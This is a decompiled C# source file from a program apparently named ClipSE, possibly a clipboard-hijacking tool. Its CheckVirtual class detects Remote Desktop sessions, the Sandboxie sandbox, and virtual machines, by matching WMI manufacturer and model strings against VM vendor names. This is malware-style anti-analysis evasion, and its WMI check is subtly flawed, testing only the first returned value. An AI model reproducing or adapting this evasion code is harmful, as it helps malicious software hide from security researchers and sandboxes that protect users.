using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Windows.Forms;

namespace ClipSE
{
	// Token: 0x0200000E RID: 14
	public static class CheckVirtual
	{
		// Token: 0x0600002B RID: 43 RVA: 0x00002DFC File Offset: 0x00000FFC
		public static bool GetIsRdpAvailable()
		{
			return SystemInformation.TerminalServerSession;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002E03 File Offset: 0x00001003
		public static bool GetSandBoxies()
		{
			return Process.GetProcessesByName("SbieCtrl").Length > 0 && NativeMethods.GetModuleHandle("SbieDll.dll") != IntPtr.Zero;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002E2C File Offset: 0x0000102C
		private static List<string> GetModelsAndManufactures()
		{
			List<string> list = new List<string>();
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							list.Add(managementBaseObject["Manufacturer"].ToString().ToLower());
							list.Add(managementBaseObject["Model"].ToString().ToLower());
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x0600002E RID: 46 RVA: 0x00002F08 File Offset: 0x00001108
		public static bool CheckWMI()
		{
			List<string> list = new List<string>
			{
				"virtual",
				"vmbox",
				"vmware",
				"virtualbox",
				"box",
				"thinapp",
				"VMXh",
				"innotek gmbh",
				"tpvcgateway",
				"tpautoconnsvc",
				"vbox",
				"kvm",
				"red hat"
			};
			List<string> modelsAndManufactures = CheckVirtual.GetModelsAndManufactures();
			using (List<string>.Enumerator enumerator = modelsAndManufactures.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					string item = enumerator.Current;
					return list.Contains(item);
				}
			}
			return false;
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00002FFC File Offset: 0x000011FC
		public static bool Inizialize()
		{
			return CheckVirtual.GetIsRdpAvailable() || CheckVirtual.GetSandBoxies() || CheckVirtual.CheckWMI();
		}
	}
}
